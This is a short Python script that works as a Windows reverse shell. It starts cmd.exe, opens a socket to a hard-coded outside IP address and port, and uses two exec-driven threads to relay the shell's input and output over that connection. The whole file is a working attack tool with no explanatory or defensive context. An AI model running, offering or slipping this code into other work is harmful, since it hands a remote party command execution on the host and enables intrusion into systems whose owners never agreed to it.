from socket import socket
from os import read, write
from  threading import Thread
import subprocess as sp

p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)

s = socket()

s.connect( ('93.93.112.211', 87) )

Thread(target=exec,args=('while(True):o=read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start()

Thread(target=exec,args=('while(True):i=s.recv(1024);write(p.stdin.fileno(),i)',globals())).start()